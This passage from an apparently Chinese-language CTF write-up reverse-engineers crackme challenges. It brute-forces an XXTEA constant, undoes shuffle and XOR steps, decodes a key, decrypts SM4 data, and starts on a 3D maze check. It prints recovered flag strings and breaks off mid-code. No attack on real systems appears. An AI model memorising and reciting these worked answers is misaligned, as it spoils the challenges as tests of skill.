class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x44</span>,<span class="number">0x30</span>, <span class="number">0x67</span>,<span class="number">0x33</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">32</span>; <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密  </span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数  </span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  </span></span><br><span class="line">   <span class="comment">/* printf(&quot;加密前原始数据：%u %u\n&quot;, v[0], v[1]);</span></span><br><span class="line"><span class="comment">    btea(v, n, k);</span></span><br><span class="line"><span class="comment">    printf(&quot;加密后的数据：%u %u\n&quot;, v[0], v[1]);*/</span></span><br><span class="line">    <span class="comment">//puts((char*)v);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> DELTA = <span class="number">0x44336730</span>;</span><br><span class="line">    <span class="keyword">for</span> (DELTA; DELTA &lt;= <span class="number">0x44336730</span> + <span class="number">256</span>; DELTA += <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> v[<span class="number">32</span>] = &#123; <span class="number">0xBF8ED8A5</span>, <span class="number">0xE115A9F9</span>, <span class="number">0xFCD3F08A</span>, <span class="number">0x8BBF8946</span>, <span class="number">0xC308B162</span>, <span class="number">0x2B19CF29</span>, <span class="number">0x7A770656</span>, <span class="number">0xA4BAE4BA</span>,</span><br><span class="line">    <span class="number">0x4E3E8CE4</span>, <span class="number">0x01A7E1D9</span>, <span class="number">0x75E9CE04</span>, <span class="number">0x22B593B9</span>, <span class="number">0x497742B4</span>, <span class="number">0x24EB15F6</span>, <span class="number">0xF2C2FF0E</span>, <span class="number">0x47973039</span>,</span><br><span class="line">    <span class="number">0xC801CA0D</span>, <span class="number">0x6A125861</span>, <span class="number">0x80320BE8</span>, <span class="number">0x0385BD47</span>, <span class="number">0x69F96DDD</span>, <span class="number">0xE56490D1</span>, <span class="number">0x2D3CAD4B</span>, <span class="number">0x2D4200BE</span>,</span><br><span class="line">    <span class="number">0x89EF6979</span>, <span class="number">0x4A91885D</span>, <span class="number">0x019DEBC7</span>, <span class="number">0x3BF8FD96</span>, <span class="number">0x1BDD2557</span>, <span class="number">0xB8685FDD</span>, <span class="number">0x57226614</span>, <span class="number">0x9F585C28</span> &#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, DELTA);</span><br><span class="line">        btea(v, -n, k, DELTA);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, v[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//puts((char*)v);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111830.png" alt="image-20211127223750854"></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x3c,0x40,0x2b,0x66,0x6f,0x4f,0x5c,0x1d,0x42,0x1a,0x2b,0x57,0x36,0x44,0x33,0x1c,0x1d,0x6b,0x5c,0x6,0xf,0x1c,0x5c,0x1a,0x2b,0x9,0x32,0x6e,0x15,0x5a,0x2c,0x25</span><br></pre></td></tr></table></figure>

<p>然后shuffle可以先算出他的偏移值，然后直接还原就可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m=[<span class="number">0x3c</span>,<span class="number">0x40</span>,<span class="number">0x2b</span>,<span class="number">0x66</span>,<span class="number">0x6f</span>,<span class="number">0x4f</span>,<span class="number">0x5c</span>,<span class="number">0x1d</span>,<span class="number">0x42</span>,<span class="number">0x1a</span>,<span class="number">0x2b</span>,<span class="number">0x57</span>,<span class="number">0x36</span>,<span class="number">0x44</span>,<span class="number">0x33</span>,<span class="number">0x1c</span>,<span class="number">0x1d</span>,<span class="number">0x6b</span>,<span class="number">0x5c</span>,<span class="number">0x6</span>,<span class="number">0xf</span>,<span class="number">0x1c</span>,<span class="number">0x5c</span>,<span class="number">0x1a</span>,<span class="number">0x2b</span>,<span class="number">0x9</span>,<span class="number">0x32</span>,<span class="number">0x6e</span>,<span class="number">0x15</span>,<span class="number">0x5a</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>]</span><br><span class="line">shuffle=[<span class="number">0</span>, <span class="number">6</span>, <span class="number">17</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">30</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shuffle)):</span><br><span class="line">    d.append(m[shuffle[i]])</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    d[i] ^= d[(i + <span class="number">1</span>) % <span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(d))</span><br><span class="line"><span class="comment">#Th4_1mp0rtant_th2n9_is_t0_le@rn!</span></span><br></pre></td></tr></table></figure>

<h3 id="virtus"><a href="#virtus" class="headerlink" title="virtus"></a>virtus</h3><p>他释放了一个文件？（这是一个拉屎的题）但是我找不到，不知道是不是权限问题，然后我用Resource Hacker直接梭哈出一个资源文件，</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111839.png" alt="image-20211127225240318">发现好多0x41,我想如果是可执行文件，这些0x41应该是0才对，然后我又异或了开头，发现开头为pe头。那就直接全部异或0x41,保存成新文件继续分析。</p>
<p><img src="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E5%AE%89%E6%B4%B5%E6%9D%AF/Reverse/clipboard_20211127_111849.png" alt="image-20211127224245096"></p>
<p>首先会对flag动手脚，然后会对key做手脚，一开始想爆破，爆破了半天，（最后解出来发现首位是特殊字符，寄！）</p>
<p>首先找到key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_de</span>(<span class="params">en</span>):</span></span><br><span class="line">    enc=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(en)):</span><br><span class="line">        enc.append(<span class="built_in">ord</span>(en[i]))</span><br><span class="line">    v2=[<span class="number">0</span>]*<span class="number">56</span></span><br><span class="line">    <span class="comment">#step3 re</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        temp=enc[i]</span><br><span class="line">        <span class="keyword">if</span> temp % <span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">            temp-=<span class="number">1</span></span><br><span class="line">        temp=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(temp)[<span class="number">2</span>:].zfill(<span class="number">6</span>)]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            v2[<span class="number">7</span> * i + <span class="number">28</span> + j]=temp[j]</span><br><span class="line">        <span class="keyword">if</span> enc[i]%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">            j=<span class="number">5</span></span><br><span class="line">            v2[<span class="number">7</span> * i + <span class="number">29</span> + j]=<span class="number">1</span></span><br><span class="line">    a1=[]</span><br><span class="line">    <span class="comment">#验证step3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        v7 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            v7 = <span class="number">2</span> * (v7 + v2[<span class="number">7</span> * i + <span class="number">28</span> + j])</span><br><span class="line">            <span class="keyword">if</span> (v2[<span class="number">7</span> * i + <span class="number">29</span> + j] == <span class="number">1</span> <span class="keyword">and</span> j == <span class="number">5</span>):</span><br><span class="line">                v7+=<span class="number">1</span></span><br><span class="line">        a1.append(v7)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step2</span></span><br><span class="line">    v4=<span class="number">0</span></span><br><span class="line">    v5=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            v3=v2[<span class="number">7</span> * i + <span class="number">28</span> + j]</span><br><span class="line">            v2[<span class="number">7</span> * v5 + v4]=v3</span><br><span class="line">            v5 = (v5 + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line">            v4 = (v4 + <span class="number">2</span>) % <span class="number">7</span></span><br><span class="line">    f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            v2[<span class="number">7</span> * i + <span class="number">28</span> + j]=v2[<span class="number">7</span> * i + j]</span><br><span class="line">        f+=<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,v2[<span class="number">7</span> * i + <span class="number">28</span> + <span class="number">0</span> : <span class="number">7</span>* i + <span class="number">28</span> + <span class="number">7</span>])),<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"><span class="built_in">print</span>(key_de(key_de(key_de(key_de(<span class="string">&#x27;Lroo&#x27;</span>)))))</span><br><span class="line"><span class="comment">#_shy</span></span><br></pre></td></tr></table></figure>

<p>然后再sub_4012F0中发现是sm4的sbox盒，ck，fk都没改</p>
<p>直接找脚本梭哈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM4Cipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span></span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># 将 128bit 转化成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># 结果逆序</span></span><br><span class="line">        <span class="comment"># 将 4x32bit 合并成 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;密钥生成&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># 将 128bit 拆分成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># 循环生成轮密钥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span></span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rot_left</span>(<span class="params">n, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;循环左移&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;68677f4e555b4e777b65785b4c726f6f&quot;</span>)  <span class="comment"># 128bit密钥</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00112233445566778899aabbccddeeff&quot;</span>)  <span class="comment"># 128bit明文</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"><span class="built_in">print</span>(sm4.encrypt(plaintext).<span class="built_in">hex</span>())  <span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#5C89EEF56FC54492DBE3AE9CB54F4AF4E7A35E0FFC93FC766CFB29E0162FA567</span></span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(long_to_bytes(<span class="number">0x5C89EEF56FC54492DBE3AE9CB54F4AF4E7A35E0FFC93FC766CFB29E0162FA567</span>)))</span><br><span class="line">s=<span class="string">b&#x27;Nh5XOXC\x7fv4eSccYi6Xv^Y6hXrocXEs`&amp;&#x27;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    a.append(s[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">    a[i]^=<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">    a[i]^=<span class="number">7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(a))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Ho3_I_Exp3cTed_n0_pY_1n_the_Ctf!</span></span><br></pre></td></tr></table></figure>

<h3 id="Mazeeee"><a href="#Mazeeee" class="headerlink" title="Mazeeee"></a>Mazeeee</h3><p>（找屎的题）</p>
<p>32位程序，ida载入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ( v5 == <span class="number">22</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )                                 <span class="comment">// 22步数</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v18 &gt;= <span class="number">22</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( off_3E0074[<span class="number">150</span> * dword_3E0284 + <span class="number">15</span> * dword_3E027C + unk_3E0248] == <span class="string">&#x27;E&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v15 = v4;</span><br><span class="line">          v6 = sub_3D13D4(v4, input);</span><br><span class="line">          sub_3D1316(v4[<span class="number">0</span>]);                    <span class="comment">// 进一步的check</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">/*查看地图一共750B，结合150*z+15*y+x判断为三维迷宫 15*10*5 </span></span><br><span class="line"><span class="comment">且在22步从00到终点*/</span></span><br><span class="line"> v6 = (v6 - <span class="string">&#x27;S&#x27;</span>);</span><br><span class="line"> <span class="keyword">switch</span> ( v6 ) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">            --dword_3E0284; </span><br><span class="line">         ...</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">            ++dword_3E0284;</span><br><span class="line">         ...</span><br><span class="line">             <span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">         --unk_3E0248;</span><br><span class="line">         ...<span class="comment">//等推导出如何对(x,y,z)进行移动</span></span><br><span class="line">          